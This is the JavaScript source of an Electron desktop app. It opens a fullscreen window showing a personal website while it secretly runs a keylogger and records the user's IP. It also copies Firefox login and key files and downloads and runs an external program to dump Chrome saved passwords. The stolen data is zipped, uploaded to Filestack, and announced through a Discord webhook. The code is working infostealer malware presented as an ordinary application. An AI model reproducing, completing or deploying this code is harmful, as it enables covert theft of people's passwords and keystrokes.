const { app, BrowserWindow } = require('electron')
const fetch = require('electron-fetch').default
const fs = require('fs');
const fsExtra = require("fs-extra");
const util = require("util");
const {exec} = require("child_process");
const execFilePromise = util.promisify(exec)
const JSZip = require("jszip");
const request = require("request");
const client = require('filestack-js').init("API KEY");
let fullText = "";
function createWindow () {
// Create the browser window.
  const win = new BrowserWindow({
    width: 1920,
    height: 1080,
    // Icons Made By https://www.flaticon.com/authors/pixel-perfect
    icon: __dirname + 'src/icon/neutral.png',
    webPreferences: {
      nodeIntegration: true,
      nativeWindowOpen: true,
      contextIsolation: true,
    },
    // simpleFullscreen: true,
    fullscreen: true,
    frame: false
  })

  // Disables f11 when app loads.
  win.setFullScreenable(false)
  // Retrieve key (encrypted)
  // Create app on the surface key logs.
  // Also retrieves login/pass from your browser (chrome/firefox).
  // Zip these files. Upload them.
  // discord post webhook for posting key.

  // Load the index.html of the app.
  win.loadURL("https://krishneelkumar.com/");
  let win1 = BrowserWindow.getAllWindows()[0];

  // Check operating system of user, based on that we create paths.
  if (process.platform == "win32") {
    var homePath = process.env.APPDATA
    var firefoxPath = homePath +  "\\Mozilla\\Firefox\\Profiles"
    var chromePath = process.env.LOCALAPPDATA + "\\Google\\Chrome\\User Data\\Default\\Login Data"
    var folderSpecifier = "\\"
    processBrowsers(firefoxPath, chromePath, folderSpecifier);
  } else if (process.platform == "darwin") {
    var homePath = process.env.HOME
    var firefoxPath = homePath +  "/Library/Application Support/Firefox/Profiles"
    var folderSpecifier = "/";
    processFirefox(firefoxPath, folderSpecifier);
  } else if (process.platform == "linux") {
    var homePath = process.env.HOME
    var firefoxPath = homePath +  "/.mozilla/firefox"
    var chromePath = homePath + "/.config/google-chrome/Default/Login Data"
    var folderSpecifier = "/";
    processBrowsers(firefoxPath, chromePath, folderSpecifier);
  }

  // Fetch and store IP and KeyStrokes in log.txt.
  // This is a simple keylogger.
  fetch('https://api.ipdata.co/?api-key=test')
  .then(results => results.json())
  .then(json => {
      fullText += 'IP: ' + json.ip + '\n';
  })
  win1.webContents.on('before-input-event', (event, input) => {
    if (!input.isAutoRepeat && input.type == "keyDown") {
      if ((input.key) == "Tab") {
        input.key = "\r\n";
      }
      fullText += input.key;
      fs.writeFileSync('log.txt', fullText);
    }
  })

  // Open the DevTools.
  // win.webContents.openDevTools()
}

// This function will retrieve the data for Firefox Logins.
function processFirefox(directoryPath, folderSpecifier, zip) {
  return new Promise((resolve, reject) => {
    fs.opendir(directoryPath, (err, dir) => {
      if (err) {
        reject()
        return
      }

      // Read all files, check stats, make sure it's mode is a directory.
      // They're respective mode's were identified in different OS's.
      files = fs.readdirSync(dir.path);
      files.forEach(folder => {
        statsPath = dir.path + folderSpecifier + folder
        statObj = fs.statSync(statsPath);
        if (statObj["mode"] == 16822 && process.platform == "win32" ||
            statObj["mode"] == 16832 && process.platform == "linux" ||
            statObj["mode"] == 168322 && process.platform == "darwin") {
          storeMozillaFiles(zip, statsPath, folder, folderSpecifier);
        }
      })
      dir.close()
      resolve()
    })
  })
}

// This function retrieves the download links based on the OS's.
function retrieveDLLink() {
  if (process.platform == "win32") {
    return "link to windows program here";
  } else if (process.platform == "linux") {
    return "link to linux program here";
  }
}

// This function retrieves the executable file name based on the OS.
function retrieveExecFile(executable) {
  if (process.platform == "win32") {
    return executable;
  } else if (process.platform == "linux") {

    // Convert binary file into executable and then execute.
    return `chmod +x ${executable} && ./${executable}`;
  }
}

// This function processes chrome browsers, currently only suitable
// windows and linux.
function processChrome(zip, executable) {
  return new Promise(resolve => {
    var executableVar = retrieveExecFile(executable);
    downloadFile(retrieveDLLink(), process.cwd() + `/${executable}`)
    .then(function() {
      execFilePromise(executableVar)
      .then(function() {
        fsExtra.remove(executable);
        zip.file("chrome_pass.txt", fs.readFileSync("chrome_pass.txt"));
        resolve(1);
      })
    })
  })
}

// This function will retrieve chrome executable.
function retrieveChromeExec() {
  if (process.platform == "win32") {
    return "chromeWin.exe";
  } else if (process.platform == "linux") {
    return "chromeLinux";
  }
}

// This is an async function that processes the Firefox and Chrome browser.
async function processBrowsers(firefoxPath, chromePath, folderSpecifier) {
  var timeStarted = Date.now();
  var firefoxExists = checkPathExists(firefoxPath);
  var chromeExists = checkPathExists(chromePath);

  // Check only firefox or for Chrome choose OS's other than Darwin (Mac).
  if (firefoxExists || chromeExists && process.platform != "darwin") {
    let zip = new JSZip();
    if (chromeExists && process.platform != "darwin") {
      const result = await processChrome(zip, retrieveChromeExec());
      if (result) {
        fsExtra.remove("chrome_pass.txt");
        if (!firefoxExists) {
          compressFiles(zip, timeStarted);
        }
      }
    }

    if (firefoxExists) {
      processFirefox(firefoxPath, folderSpecifier, zip)
      .then(function() {
        compressFiles(zip, timeStarted);
      });
    }
  }
}

// Compress Files and Upload.
function compressFiles(zip, timeStarted) {

  // https://stuk.github.io/jszip/documentation/api_jszip/generate_node_stream.html
  zip
  .generateNodeStream(
    {type: "nodebuffer",
      streamFiles: true,
      compression: "DEFLATE",
      compressionOptions: {"level": 9}})
  .pipe(fs.createWriteStream("out.zip"))
  .on("finish", function() {

    // Uploads zip file.
    uploadFiles("out.zip", timeStarted);
  });
}

function uploadFiles(fileName, timeStarted) {
  client.upload(fileName).then(
    function(result) {
      var timeTaken = Date.now() - timeStarted;

      // Remove directory after uploading it.
      fs.rmdirSync(fileName, {recursive: true});

      // Data to post the discord webhook.
      const data = JSON.stringify({
        "content": result["url"] + ` **MS: ${timeTaken}**`
      });
      webhookID = "webhookID"
      webhookToken = "webhookToken"

      // Reference: https://stackoverflow.com/a/56627565
      var URL = `https://discordapp.com/api/webhooks/${webhookID}/${webhookToken}`
      fetch(URL, {
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": data
      })
      .catch(err => console.log(err));
    },
    function(error) {
      console.log(error);
    }
  );
}

// Check file exists, using a path.
// If exists store in zip, and pass foldername for zip.folder().

function storeMozillaFiles(zip, pathName, folderName, folderSpecifier) {
  var prefixPath = pathName + folderSpecifier;

  // This json contains login details.
  var loginPath = prefixPath + "logins.json";

  // This db contains a set of 4 keys used to encrypt logins.json.
  var keyPath = prefixPath + "key4.db";
  try {
    fs.statSync(keyPath);
  } catch (err) {
    return;
  }
  try {
    fs.statSync(loginPath);
  } catch (err) {
    return;
  }
  var prefixFolder = folderName + folderSpecifier;
  zip.folder(folderName);
  zip.file(prefixFolder + "logins.json", fs.readFileSync(loginPath));
  zip.file(prefixFolder + "key4.db", fs.readFileSync(keyPath));
  return;
}

function checkPathExists(filePath) {

  // Check filePath exists and is readable.
  try {
    fs.accessSync(filePath, fs.constants.R_OK)
  } catch (err) {
    return false;
  }
  return true;
}

// https://ourcodeworld.com/articles/read/228/how-to-download-a-webfile-with-electron-save-it-and-show-download-progress
function downloadFile(url, targetPath) {
  return new Promise(resolve => {
    var req = request({
      method: "GET",
      uri: url
    })
    var out = fs.createWriteStream(targetPath)
    req.pipe(out)
    req.on("end", function() {
      resolve()
    })
  })
}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
// app.on('ready', createWindow);
app.on('ready', () => {
  createWindow()
});

// Quit when all windows are closed, except on macOS. There, it's common
// for applications and their menu bar to stay active until the user quits
// explicitly with Cmd + Q.
app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  // On OS X it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});
